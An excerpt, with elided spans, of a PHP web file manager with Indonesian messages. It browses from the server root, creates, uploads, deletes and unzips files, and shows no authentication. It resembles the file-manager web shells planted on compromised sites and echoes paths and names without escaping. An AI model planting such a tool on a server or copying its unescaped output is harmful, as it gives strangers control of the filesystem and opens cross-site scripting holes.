...
function breadcrumb($p){ $p=rtrim($p,'/'); $o='📍 <a href="?d=/">/</a>'; $b=''; foreach(explode('/',$p) as $x){ if(!$x)continue; $b.="/$x"; $o.=" / <a href='?d=$b'>$x</a>"; } return "<div style='margin:6px 0;font-size:13px'>$o</div>"; }
...
if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    ...
    if (!file_exists($newdir)) {
        $msg = mkdir($newdir, 0755) ? "✅ Folder berhasil dibuat" : "❌ Gagal membuat folder";
    } else $msg = "❌ Folder sudah ada";
}
...
if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
    ...
    if (!file_exists($newfile)) {
        $msg = file_put_contents($newfile, "") !== false ? "✅ File berhasil dibuat" : "❌ Gagal membuat file";
    } else $msg = "❌ File sudah ada";
}

// Upload
if (!empty($_FILES['f']['name'])) {
    $n = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($_FILES['f']['name']));
    $msg = move_uploaded_file($_FILES['f']['tmp_name'], "$pwd/$n") ? "✅ Upload sukses" : "❌ Upload gagal";
}
...
if (isset($_GET['del'])) {
    ...
    if (is_dir($target)) {
        ...
        $msg = deleteDir($target) ? "✅ Folder berhasil dihapus" : "❌ Gagal menghapus folder";
    } else {
        $msg = unlink($target) ? "✅ File berhasil dihapus" : "❌ Gagal menghapus file";
    }
}
...
if (isset($_GET['unzip'])) {
    ...
    if (is_file($z) && preg_match('/\.zip$/i', $z)) {
        ...
        if ($zip->open($z) === TRUE) {
            ...
            $zip->extractTo($dest);
            $zip->close();
            $unzip_msg = "✅ Unzip ke <b>$dest</b>";
        } else $unzip_msg = "❌ Gagal unzip";
    }
}
...
.splitter::after{content:"⋮⋮";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#64748b;font-size:12px;letter-spacing:2px}
...
<tr>
  <td>📂 <a href="?d=<?=urlencode($p)?>"><?=$f?></a></td>
  <td><small>—</small></td>
...
<?php endforeach ?>
      <tr><td colspan="5" class="sep">— FILE —</td></tr>
